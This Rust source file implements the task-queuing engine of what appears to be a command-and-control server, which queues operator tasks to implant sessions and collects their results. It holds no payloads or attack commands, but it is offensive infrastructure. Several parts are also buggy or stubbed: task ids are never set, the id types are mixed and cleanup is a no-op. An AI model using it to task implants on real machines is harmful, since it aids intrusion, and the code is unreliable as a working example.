use crate::database::models::{Task, TaskStatus};
use crate::database::repository::TaskRepository;
use crate::protocol::messages::proto::{TaskAssignment, TaskResult, InnerServerMessage, inner_server_message};
use crate::tasks::TaskType;
use std::collections::{HashMap, VecDeque};
use std::sync::Arc;
use tokio::sync::{RwLock, mpsc};
use tracing;

/// Task execution engine managing task lifecycle
pub struct TaskEngine {
    repository: Arc<TaskRepository<'static>>,
    /// In-memory queue of pending tasks per session
    pending_queues: RwLock<HashMap<String, VecDeque<Task>>>,
    /// Active tasks being executed (session_id -> task_id)
    active_tasks: RwLock<HashMap<String, u64>>,
    /// Results awaiting pickup by operators
    completed_results: RwLock<HashMap<u64, TaskResult>>,
    /// Channels for notifying operators of task completion
    operator_notifiers: RwLock<HashMap<String, mpsc::Sender<TaskNotification>>>,
}

#[derive(Debug, Clone)]
pub struct TaskNotification {
    pub task_id: u64,
    pub session_id: String,
    pub status: TaskStatus,
    pub has_result: bool,
}

impl TaskEngine {
    pub fn new(repository: Arc<TaskRepository<'static>>) -> Self {
        Self {
            repository,
            pending_queues: RwLock::new(HashMap::new()),
            active_tasks: RwLock::new(HashMap::new()),
            completed_results: RwLock::new(HashMap::new()),
            operator_notifiers: RwLock::new(HashMap::new()),
        }
    }
    
    /// Queue a new task for a session
    pub async fn queue_task(
        &self,
        session_id: &str,
        campaign_id: &str,
        task_type: TaskType,
        payload: Vec<u8>,
        issued_by: &str,
        timeout_seconds: u32,
    ) -> crate::Result<u64> {
        // Validate task
        if payload.len() > 10 * 1024 * 1024 { // 10MB limit
            return Err(crate::OblivionError::Protocol("Task payload too large".into()));
        }
        
        let task = Task {
            id: 0, // Will be set by database
            session_id: session_id.to_string(),
            campaign_id: campaign_id.to_string(),
            task_type: task_type.to_string(),
            payload: Some(payload),
            issued_at: chrono::Utc::now(),
            issued_by: issued_by.to_string(),
            status: TaskStatus::Pending,
            timeout_seconds: Some(timeout_seconds as i32),
            result: None,
            error_message: None,
            completed_at: None,
            execution_time_ms: None,
        };
        
        // Persist to database
        let task_id = self.repository.create(&task).await?;
        
        // Add to in-memory queue
        let mut queues = self.pending_queues.write().await;
        queues.entry(session_id.to_string())
            .or_insert_with(VecDeque::new)
            .push_back(task);
        
        tracing::info!(
            task_id = task_id,
            session_id = %session_id,
            task_type = %task_type,
            "Task queued"
        );
        
        Ok(task_id)
    }
    
    /// Get next pending tasks for a session (called during heartbeat)
    pub async fn get_pending_tasks(
        &self,
        session_id: &str,
        max_tasks: usize,
    ) -> crate::Result<Vec<TaskAssignment>> {
        let mut queues = self.pending_queues.write().await;
        let queue = queues.get_mut(session_id);
        
        if let Some(queue) = queue {
            let mut tasks = Vec::with_capacity(max_tasks.min(queue.len()));
            let mut active = self.active_tasks.write().await;
            
            while tasks.len() < max_tasks && !queue.is_empty() {
                if let Some(task) = queue.pop_front() {
                    // Mark as assigned
                    self.repository.update_status(
                        task.id,
                        TaskStatus::Assigned,
                        None,
                        None,
                        None,
                    ).await?;
                    
                    // Track as active
                    active.insert(session_id.to_string(), task.id);
                    
                    tasks.push(TaskAssignment::from(task));
                }
            }
            
            // Clean up empty queues
            if queue.is_empty() {
                queues.remove(session_id);
            }
            
            Ok(tasks)
        } else {
            Ok(vec![])
        }
    }
    
    /// Process a task result from an implant
    pub async fn process_result(
        &self,
        result: TaskResult,
    ) -> crate::Result<()> {
        let task_id = result.task_id as i64;
        
        // Determine status and extract data
        let (status, data, error, exec_time) = match &result.result {
            Some(crate::protocol::messages::proto::task_result::Result::Output(data)) => {
                tracing::info!(task_id = result.task_id, "Task completed successfully");
                (TaskStatus::Completed, Some(data.clone()), None, None)
            }
            Some(crate::protocol::messages::proto::task_result::Result::Error(msg)) => {
                tracing::warn!(task_id = result.task_id, error = %msg, "Task failed");
                (TaskStatus::Failed, None, Some(msg.clone()), None)
            }
            Some(crate::protocol::messages::proto::task_result::Result::Timeout(true)) => {
                tracing::warn!(task_id = result.task_id, "Task timed out");
                (TaskStatus::Timeout, None, Some("Execution timeout".to_string()), None)
            }
            None => {
                tracing::error!(task_id = result.task_id, "Empty task result");
                (TaskStatus::Failed, None, Some("Empty result".to_string()), None)
            }
        };
        
        // Update database
        self.repository.update_status(
            task_id,
            status.clone(),
            data.clone(),
            error.clone(),
            exec_time,
        ).await?;
        
        // Remove from active tasks
        {
            let mut active = self.active_tasks.write().await;
            // Find and remove the session mapping
            active.retain(|_, &mut id| id != task_id as u64);
        }
        
        // Store result for operator pickup
        {
            let mut results = self.completed_results.write().await;
            results.insert(task_id as u64, result.clone());
        }
        
        // Notify operator
        self.notify_operator(task_id as u64, status).await;
        
        Ok(())
    }
    
    /// Get task status and result
    pub async fn get_task_status(&self, task_id: u64) -> crate::Result<Option<(TaskStatus, Option<TaskResult>)>> {
        // Check in-memory results first
        let results = self.completed_results.read().await;
        if let Some(result) = results.get(&task_id) {
            let status = match &result.result {
                Some(crate::protocol::messages::proto::task_result::Result::Output(_)) => TaskStatus::Completed,
                Some(crate::protocol::messages::proto::task_result::Result::Error(_)) => TaskStatus::Failed,
                Some(crate::protocol::messages::proto::task_result::Result::Timeout(_)) => TaskStatus::Timeout,
                None => TaskStatus::Failed,
            };
            return Ok(Some((status, Some(result.clone()))));
        }
        drop(results);
        
        // Check active tasks
        let active = self.active_tasks.read().await;
        if active.values().any(|&id| id == task_id) {
            return Ok(Some((TaskStatus::InProgress, None)));
        }
        
        // Fallback to database query
        // Note: This would need a get_by_id method in the repository
        Ok(None)
    }
    
    /// Cancel a pending task
    pub async fn cancel_task(
        &self,
        task_id: u64,
        operator_id: &str,
    ) -> crate::Result<bool> {
        // Remove from queue if still pending
        let mut queues = self.pending_queues.write().await;
        for (_, queue) in queues.iter_mut() {
            let original_len = queue.len();
            queue.retain(|t| t.id != task_id as i64);
            if queue.len() < original_len {
                // Update database
                self.repository.update_status(
                    task_id as i64,
                    TaskStatus::Failed,
                    None,
                    Some("Cancelled by operator".to_string()),
                    None,
                ).await?;
                
                tracing::info!(
                    task_id = task_id,
                    operator_id = %operator_id,
                    "Task cancelled"
                );
                
                return Ok(true);
            }
        }
        
        Ok(false) // Task not found in queue (might be active)
    }
    
    /// Register operator notification channel
    pub async fn register_operator_notifier(
        &self,
        operator_id: String,
        tx: mpsc::Sender<TaskNotification>,
    ) {
        let mut notifiers = self.operator_notifiers.write().await;
        notifiers.insert(operator_id, tx);
    }
    
    /// Unregister operator notification channel
    pub async fn unregister_operator_notifier(&self, operator_id: &str) {
        let mut notifiers = self.operator_notifiers.write().await;
        notifiers.remove(operator_id);
    }
    
    /// Internal: Notify operator of task completion
    async fn notify_operator(&self, task_id: u64, status: TaskStatus) {
        // Get task details to find operator
        // This is simplified - in production you'd track which operator issued the task
        
        let notifiers = self.operator_notifiers.read().await;
        for (operator_id, tx) in notifiers.iter() {
            let notification = TaskNotification {
                task_id,
                session_id: "unknown".to_string(), // Would lookup from task
                status: status.clone(),
                has_result: matches!(status, TaskStatus::Completed | TaskStatus::Failed),
            };
            
            if let Err(_) = tx.send(notification).await {
                tracing::warn!("Failed to notify operator {}", operator_id);
            }
        }
    }
    
    /// Cleanup old completed results (call periodically)
    pub async fn cleanup_old_results(&self, max_age_hours: i64) -> usize {
        let cutoff = chrono::Utc::now() - chrono::Duration::hours(max_age_hours);
        let mut results = self.completed_results.write().await;
        
        let original_len = results.len();
        results.retain(|_, result| {
            // Keep if completed recently (would need timestamp in result)
            true // Simplified - implement age check based on your needs
        });
        
        original_len - results.len()
    }
    
    /// Get queue statistics for monitoring
    pub async fn get_statistics(&self) -> TaskEngineStatistics {
        let queues = self.pending_queues.read().await;
        let active = self.active_tasks.read().await;
        let results = self.completed_results.read().await;
        
        TaskEngineStatistics {
            pending_queues: queues.len(),
            total_pending_tasks: queues.values().map(|q| q.len()).sum(),
            active_tasks: active.len(),
            completed_results_awaiting_pickup: results.len(),
        }
    }
    
    /// Requeue tasks for stale sessions (called when session goes stale)
    pub async fn handle_session_stale(&self, session_id: &str) -> crate::Result<u64> {
        // Mark active tasks as failed
        let mut active = self.active_tasks.write().await;
        let mut failed_count = 0;
        
        if let Some(task_id) = active.remove(session_id) {
            self.repository.update_status(
                task_id as i64,
                TaskStatus::Failed,
                None,
                Some("Session became stale".to_string()),
                None,
            ).await?;
            failed_count += 1;
        }
        
        // Clear any pending tasks
        let mut queues = self.pending_queues.write().await;
        if let Some(queue) = queues.remove(session_id) {
            for task in queue {
                self.repository.update_status(
                    task.id,
                    TaskStatus::Failed,
                    None,
                    Some("Session became stale".to_string()),
                    None,
                ).await?;
                failed_count += 1;
            }
        }
        
        Ok(failed_count)
    }
}

#[derive(Debug, Clone)]
pub struct TaskEngineStatistics {
    pub pending_queues: usize,
    pub total_pending_tasks: usize,
    pub active_tasks: usize,
    pub completed_results_awaiting_pickup: usize,
}

impl TaskEngine {
    /// Bulk queue tasks for multiple sessions
    pub async fn broadcast_task(
        &self,
        session_ids: Vec<String>,
        campaign_id: &str,
        task_type: TaskType,
        payload: Vec<u8>,
        issued_by: &str,
        timeout_seconds: u32,
    ) -> crate::Result<Vec<u64>> {
        let mut task_ids = Vec::with_capacity(session_ids.len());
        
        for session_id in session_ids {
            match self.queue_task(
                &session_id,
                campaign_id,
                task_type,
                payload.clone(),
                issued_by,
                timeout_seconds,
            ).await {
                Ok(id) => task_ids.push(id),
                Err(e) => tracing::error!("Failed to queue task for {}: {}", session_id, e),
            }
        }
        
        Ok(task_ids)
    }
    
    /// Get tasks for a specific session (for operator UI)
    pub async fn get_session_tasks(&self, session_id: &str) -> crate::Result<Vec<Task>> {
        // Combine pending, active, and recent completed
        let mut tasks = Vec::new();
        
        // Pending from memory
        {
            let queues = self.pending_queues.read().await;
            if let Some(queue) = queues.get(session_id) {
                tasks.extend(queue.iter().cloned());
            }
        }
        
        // Would also query database for recent tasks
        // This is a simplified version
        
        Ok(tasks)
    }
}